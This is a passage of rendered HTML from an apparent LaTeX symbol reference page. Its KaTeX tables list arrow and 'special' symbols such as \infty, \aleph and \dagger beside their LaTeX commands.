style="text-align:left">\uparrow</td><td style="text-align:center">63</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>↪</mo></mrow><annotation encoding="application/x-tex">\hookrightarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.522em;vertical-align:-0.011em;"></span><span class="mrel">↪</span></span></span></span></td><td style="text-align:left">\hookrightarrow</td></tr><tr><td style="text-align:center">29</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>↓</mo></mrow><annotation encoding="application/x-tex">\downarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mrel">↓</span></span></span></span></td><td style="text-align:left">\downarrow</td><td style="text-align:center">64</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>↩</mo></mrow><annotation encoding="application/x-tex">\hookleftarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.522em;vertical-align:-0.011em;"></span><span class="mrel">↩</span></span></span></span></td><td style="text-align:left">\hookleftarrow</td></tr><tr><td style="text-align:center">30</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>↕</mo></mrow><annotation encoding="application/x-tex">\updownarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mrel">↕</span></span></span></span></td><td style="text-align:left">\updownarrow</td><td style="text-align:center">65</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊸</mo></mrow><annotation encoding="application/x-tex">\multimap</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.54986em;vertical-align:0em;"></span><span class="mrel amsrm">⊸</span></span></span></span></td><td style="text-align:left">\multimap</td></tr><tr><td style="text-align:center">31</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>↗</mo></mrow><annotation encoding="application/x-tex">\nearrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mrel">↗</span></span></span></span></td><td style="text-align:left">\nearrow</td><td style="text-align:center">66</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>↭</mo></mrow><annotation encoding="application/x-tex">\leftrightsquigarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.37788em;vertical-align:0em;"></span><span class="mrel amsrm">↭</span></span></span></span></td><td style="text-align:left">\leftrightsquigarrow</td></tr><tr><td style="text-align:center">32</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>↙</mo></mrow><annotation encoding="application/x-tex">\swarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mrel">↙</span></span></span></span></td><td style="text-align:left">\swarrow</td><td style="text-align:center">67</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⇝</mo></mrow><annotation encoding="application/x-tex">\rightsquigarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.37788em;vertical-align:0em;"></span><span class="mrel amsrm">⇝</span></span></span></span></td><td style="text-align:left">\rightsquigarrow</td></tr><tr><td style="text-align:center">33</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>↖</mo></mrow><annotation encoding="application/x-tex">\nwarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mrel">↖</span></span></span></span></td><td style="text-align:left">\nwarrow</td><td style="text-align:center">68</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>↠</mo></mrow><annotation encoding="application/x-tex">\twoheadrightarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.53593em;vertical-align:-0.01354em;"></span><span class="mrel amsrm">↠</span></span></span></span></td><td style="text-align:left">\twoheadrightarrow</td></tr><tr><td style="text-align:center">34</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>↘</mo></mrow><annotation encoding="application/x-tex">\searrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mrel">↘</span></span></span></span></td><td style="text-align:left">\searrow</td><td style="text-align:center">69</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>↞</mo></mrow><annotation encoding="application/x-tex">\twoheadleftarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.53593em;vertical-align:-0.01354em;"></span><span class="mrel amsrm">↞</span></span></span></span></td><td style="text-align:left">\twoheadleftarrow</td></tr><tr><td style="text-align:center">35</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>↦</mo></mrow><annotation encoding="application/x-tex">\mapsto</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.522em;vertical-align:-0.011em;"></span><span class="mrel">↦</span></span></span></span></td><td style="text-align:left">\mapsto</td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:left"></td></tr></tbody></table><h3 id="219-特殊-special"><a class="markdownIt-Anchor" href="#219-特殊-special"></a> 2.1.9 特殊 Special</h3><table><thead><tr><th style="text-align:center">序号</th><th style="text-align:center">图标</th><th style="text-align:left">LaTeX</th><th style="text-align:center">序号</th><th style="text-align:center">图标</th><th style="text-align:left">LaTeX</th></tr></thead><tbody><tr><td style="text-align:center">1</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∞</mi></mrow><annotation encoding="application/x-tex">\infty</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord">∞</span></span></span></span></td><td style="text-align:left">\infty</td><td style="text-align:center">33</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">♭</mi></mrow><annotation encoding="application/x-tex">\flat</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.75em;vertical-align:0em;"></span><span class="mord">♭</span></span></span></span></td><td style="text-align:left">\flat</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">ℵ</mi></mrow><annotation encoding="application/x-tex">\aleph</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">ℵ</span></span></span></span></td><td style="text-align:left">\aleph</td><td style="text-align:center">34</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">♮</mi></mrow><annotation encoding="application/x-tex">\natural</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">♮</span></span></span></span></td><td style="text-align:left">\natural</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∁</mi></mrow><annotation encoding="application/x-tex">\complement</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.825em;vertical-align:0em;"></span><span class="mord amsrm">∁</span></span></span></span></td><td style="text-align:left">\complement</td><td style="text-align:center">35</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">♯</mi></mrow><annotation encoding="application/x-tex">\sharp</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">♯</span></span></span></span></td><td style="text-align:left">\sharp</td></tr><tr><td style="text-align:center">4</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>∍</mo></mrow><annotation encoding="application/x-tex">\backepsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mrel amsrm">∍</span></span></span></span></td><td style="text-align:left">\backepsilon</td><td style="text-align:center">36</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">╱</mi></mrow><annotation encoding="application/x-tex">\diagup</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.88333em;vertical-align:-0.19444em;"></span><span class="mord amsrm">╱</span></span></span></span></td><td style="text-align:left">\diagup</td></tr><tr><td style="text-align:center">5</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">ð</mi></mrow><annotation encoding="application/x-tex">\eth</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68889em;vertical-align:0em;"></span><span class="mord amsrm">ð</span></span></span></span></td><td style="text-align:left">\eth</td><td style="text-align:center">37</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">╲</mi></mrow><annotation encoding="application/x-tex">\diagdown</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9355500000000001em;vertical-align:-0.19444em;"></span><span class="mord amsrm">╲</span></span></span></span></td><td style="text-align:left">\diagdown</td></tr><tr><td style="text-align:center">6</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">Ⅎ</mi></mrow><annotation encoding="application/x-tex">\Finv</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68889em;vertical-align:0em;"></span><span class="mord amsrm">Ⅎ</span></span></span></span></td><td style="text-align:left">\Finv</td><td style="text-align:center">38</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⋅</mo></mrow><annotation encoding="application/x-tex">\centerdot</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.54986em;vertical-align:0em;"></span><span class="mord amsrm">⋅</span></span></span></span></td><td style="text-align:left">\centerdot</td></tr><tr><td style="text-align:center">7</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">ℏ</mi></mrow><annotation encoding="application/x-tex">\hbar</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68889em;vertical-align:0em;"></span><span class="mord">ℏ</span></span></span></span></td><td style="text-align:left">\hbar</td><td style="text-align:center">39</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⋉</mo></mrow><annotation encoding="application/x-tex">\ltimes</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66334em;vertical-align:-0.08167em;"></span><span class="mord amsrm">⋉</span></span></span></span></td><td style="text-align:left">\ltimes</td></tr><tr><td style="text-align:center">8</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">ℑ</mi></mrow><annotation encoding="application/x-tex">\Im</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">ℑ</span></span></span></span></td><td style="text-align:left">\Im</td><td style="text-align:center">40</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⋊</mo></mrow><annotation encoding="application/x-tex">\rtimes</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66334em;vertical-align:-0.08167em;"></span><span class="mord amsrm">⋊</span></span></span></span></td><td style="text-align:left">\rtimes</td></tr><tr><td style="text-align:center">9</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">ı</mi></mrow><annotation encoding="application/x-tex">\imath</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal"></span></span></span></span></td><td style="text-align:left">\imath</td><td style="text-align:center">41</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⋋</mo></mrow><annotation encoding="application/x-tex">\leftthreetimes</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69224em;vertical-align:0em;"></span><span class="mord amsrm">⋋</span></span></span></span></td><td style="text-align:left">\leftthreetimes</td></tr><tr><td style="text-align:center">10</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">ȷ</mi></mrow><annotation encoding="application/x-tex">\jmath</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal"></span></span></span></span></td><td style="text-align:left">\jmath</td><td style="text-align:center">42</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⋌</mo></mrow><annotation encoding="application/x-tex">\rightthreetimes</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69224em;vertical-align:0em;"></span><span class="mord amsrm">⋌</span></span></span></span></td><td style="text-align:left">\rightthreetimes</td></tr><tr><td style="text-align:center">11</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="double-struck">k</mi></mrow><annotation encoding="application/x-tex">\Bbbk</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68889em;vertical-align:0em;"></span><span class="mord"><span class="mord mathbb">k</span></span></span></span></span></td><td style="text-align:left">\Bbbk</td><td style="text-align:center">43</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≖</mo></mrow><annotation encoding="application/x-tex">\eqcirc</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69224em;vertical-align:0em;"></span><span class="mrel amsrm">≖</span></span></span></span></td><td style="text-align:left">\eqcirc</td></tr><tr><td style="text-align:center">12</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">ℓ</mi></mrow><annotation encoding="application/x-tex">\ell</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">ℓ</span></span></span></span></td><td style="text-align:left">\ell</td><td style="text-align:center">44</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≗</mo></mrow><annotation encoding="application/x-tex">\circeq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.95916em;vertical-align:-0.22958em;"></span><span class="mrel amsrm">≗</span></span></span></span></td><td style="text-align:left">\circeq</td></tr><tr><td style="text-align:center">13</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">℧</mi></mrow><annotation encoding="application/x-tex">\mho</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68889em;vertical-align:0em;"></span><span class="mord amsrm">℧</span></span></span></span></td><td style="text-align:left">\mho</td><td style="text-align:center">45</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≜</mo></mrow><annotation encoding="application/x-tex">\triangleq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.99865em;vertical-align:-0.08198em;"></span><span class="mrel amsrm">≜</span></span></span></span></td><td style="text-align:left">\triangleq</td></tr><tr><td style="text-align:center">14</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">℘</mi></mrow><annotation encoding="application/x-tex">\wp</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord">℘</span></span></span></span></td><td style="text-align:left">\wp</td><td style="text-align:center">46</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≏</mo></mrow><annotation encoding="application/x-tex">\bumpeq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.61048em;vertical-align:-0.06062em;"></span><span class="mrel amsrm">≏</span></span></span></span></td><td style="text-align:left">\bumpeq</td></tr><tr><td style="text-align:center">15</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">ℜ</mi></mrow><annotation encoding="application/x-tex">\Re</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">ℜ</span></span></span></span></td><td style="text-align:left">\Re</td><td style="text-align:center">47</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≎</mo></mrow><annotation encoding="application/x-tex">\Bumpeq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.61048em;vertical-align:-0.06062em;"></span><span class="mrel amsrm">≎</span></span></span></span></td><td style="text-align:left">\Bumpeq</td></tr><tr><td style="text-align:center">16</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">Ⓢ</mi></mrow><annotation encoding="application/x-tex">\circledS</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84783em;vertical-align:-0.15559em;"></span><span class="mord amsrm">Ⓢ</span></span></span></span></td><td style="text-align:left">\circledS</td><td style="text-align:center">48</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≑</mo></mrow><annotation encoding="application/x-tex">\doteqdot</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6639600000000001em;vertical-align:-0.08198em;"></span><span class="mrel amsrm">≑</span></span></span></span></td><td style="text-align:left">\doteqdot</td></tr><tr><td style="text-align:center">17</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⨿</mo></mrow><annotation encoding="application/x-tex">\amalg</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">⨿</span></span></span></span></td><td style="text-align:left">\amalg</td><td style="text-align:center">49</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≓</mo></mrow><annotation encoding="application/x-tex">\risingdotseq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6639600000000001em;vertical-align:-0.08198em;"></span><span class="mrel amsrm">≓</span></span></span></span></td><td style="text-align:left">\risingdotseq</td></tr><tr><td style="text-align:center">18</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">%</mi></mrow><annotation encoding="application/x-tex">\%</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.80556em;vertical-align:-0.05556em;"></span><span class="mord">%</span></span></span></span></td><td style="text-align:left">%</td><td style="text-align:center">50</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≒</mo></mrow><annotation encoding="application/x-tex">\fallingdotseq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6639600000000001em;vertical-align:-0.08198em;"></span><span class="mrel amsrm">≒</span></span></span></span></td><td style="text-align:left">\fallingdotseq</td></tr><tr><td style="text-align:center">19</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>†</mo></mrow><annotation encoding="application/x-tex">\dagger</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">†</span></span></span></span></td><td style="text-align:left">\dagger</td><td style="text-align:center">51</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊺</mo></mrow><annotation encoding="application/x-tex">\intercal</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord amsrm">⊺</span></span></span></span></td><td style="text-align:left">\intercal</td></tr><tr><td style="text-align:center">20</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>‡</mo></mrow><annotation encoding="application/x-tex">\ddagger</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">‡</span></span></span></span></td><td style="text-align:left">\ddagger</td><td style="text-align:center">52</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊼</mo></mrow><annotation encoding="application/x-tex">\barwedge</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8866799999999999em;vertical-align:-0.19444em;"></span><span class="mord amsrm">⊼</span></span></span></span></td><td style="text-align:left">\barwedge</td></tr><tr><td style="text-align:center">21</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>…</mo></mrow><annotation encoding="application/x-tex">\ldots</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.12em;vertical-align:0em;"></span><span class="minner">…</span></span></span></span></td><td style="text-align:left">\ldots</td><td style="text-align:center">53</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊻</mo></mrow><annotation encoding="application/x-tex">\veebar</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8866799999999999em;vertical-align:-0.19444em;"></span><span class="mord amsrm">⊻</span></span></span></span></td><td style="text-align:left">\veebar</td></tr><tr><td style="text-align:center">22</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⋯</mo></mrow><annotation encoding="application/x-tex">\cdots</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.31em;vertical-align:0em;"></span><span class="minner">⋯</span></span></span></span></td><td style="text-align:left">\cdots</td><td style="text-align:center">54</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⩞</mo></mrow><annotation encoding="application/x-tex">\doublebarwedge</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.95027em;vertical-align:-0.19444em;"></span><span class="mord amsrm">⩞</span></span></span></span></td><td style="text-align:left">\doublebarwedge</td></tr><tr><td style="text-align:center">23</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⌣</mo></mrow><annotation encoding="application/x-tex">\smile</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.35764em;vertical-align:0em;"></span><span class="mrel">⌣</span></span></span></span></td><td style="text-align:left">\smile</td><td style="text-align:center">55</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≬</mo></mrow><annotation encoding="application/x-tex">\between</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.01166em;vertical-align:-0.25583em;"></span><span class="mrel amsrm">≬</span></span></span></span></td><td style="text-align:left">\between</td></tr><tr><td style="text-align:center">24</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⌢</mo></mrow><annotation encoding="application/x-tex">\frown</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.35764em;vertical-align:0em;"></span><span class="mrel">⌢</span></span></span></span></td><td style="text-align:left">\frown</td><td style="text-align:center">56</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⋔</mo></mrow><annotation encoding="application/x-tex">\pitchfork</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69224em;vertical-align:0em;"></span><span class="mrel amsrm">⋔</span></span></span></span></td><td style="text-align:left">\pitchfork</td></tr><tr><td style="text-align:center">25</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≀</mo></mrow><annotation encoding="application/x-tex">\wr</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">≀</span></span></span></span></td><td style="text-align:left">\wr</td><td style="text-align:center">57</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊲</mo></mrow><annotation encoding="application/x-tex">\vartriangleleft</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58503em;vertical-align:-0.03517em;"></span><span class="mrel amsrm">⊲</span></span></span></span></td><td style="text-align:left">\vartriangleleft</td></tr><tr><td style="text-align:center">26</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>◃</mo></mrow><annotation encoding="application/x-tex">\triangleleft</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord">◃</span></span></span></span></td><td style="text-align:left">\triangleleft</td><td style="text-align:center">58</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⋪</mo></mrow><annotation encoding="application/x-tex">\ntriangleleft</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9115200000000001em;vertical-align:-0.20576em;"></span><span class="mrel amsrm">⋪</span></span></span></span></td><td style="text-align:left">\ntriangleleft</td></tr><tr><td style="text-align:center">27</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>▹</mo></mrow><annotation encoding="application/x-tex">\triangleright</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span 